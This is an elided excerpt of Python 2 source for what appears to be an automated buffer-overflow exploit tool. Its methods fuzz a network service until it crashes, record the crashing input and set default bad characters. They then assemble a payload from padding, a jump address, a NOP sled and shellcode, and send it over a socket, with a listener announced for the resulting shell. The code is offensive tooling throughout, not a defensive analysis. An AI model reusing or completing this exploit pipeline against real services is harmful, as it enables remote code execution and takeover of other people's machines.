...
class SERVERSOCKET():
     ...
     def Fuzzing__(self): 
        ...
        try:                  
            ...
            with open ("./Buffer_Package/Command.txt",'r') as Command:
                Command = Command.readlines()    
            try:
                try:
                    for _ in range(1000000):
                        for Commanx0 in Command :
                            ...
                            list.append(Commanx0)    
                except:
                    if  Fuzzer > 120:                           
                        print O+"\n>>>>>"+W+P+"Fuzzing Stop at " +W+Y+str(length)+W+ R+ " Characters"+W 
                        with open ('./Buffer_Package/.Vulnuble.txt','w') as Vuln:
                            Vuln.write(str(list[-1]))
                        with open('./Buffer_Package/.Vulnuble.txt','r') as readVuln :
                             self.Command_list  = readVuln.read().replace('\n','').strip()
                    else:
     ...
     def connect_servser(self):
        while True:
            try:
                ...
                if socket_1.send(self.Command_list+self.Random_String +'\r\n'):
                    time.sleep(2)                  
     ...
     def import_char(self): 
         try:
            ...
            if bad_op == Bad and len(Bad)==3: 
                ...
                time.sleep(0.30)
                print Y+"\n\r\r!---___"+W+O+"Default BadCharacter = "+W+P+"'\\x00\\0a\\0d'"+W+Y+'___---!'+W
                self.badchar ='\\x00\\0a\\0d'
                ok = 'yes'.lower()
                no = 'no'.lower()
                time.sleep(0.75)
                banner2 = Y+'\n\t\tSCHELLCODE & LISTNER'+'\n\t     '+('='*25)+W
     ...
     def attack_all(self):
            ...
            try: 
                ...
                self.NO_Operation = len(self.Random_String) - self.location  - len( self.jump_address)+len(self.Command_list)
                self.NO_Operation =self.NO_Operation*"\x90"
                self.count = self.NO_Operation.count("\x90")    
                attack = self.Command_list+Start_string+self.jump_address+ self.NO_Operation +str(shell_code)
                time.sleep(2)
     ...
     def auto_write(self): 
            ...
            try:                
                ...
                for line in fileinput.FileInput(file,inplace=1):
                    ...
                    if '_Command      = 'in line:
                        line = line.rstrip()
                        line = line.replace(line,line+ "'"+self.Command_list+"'" +'\n')                       
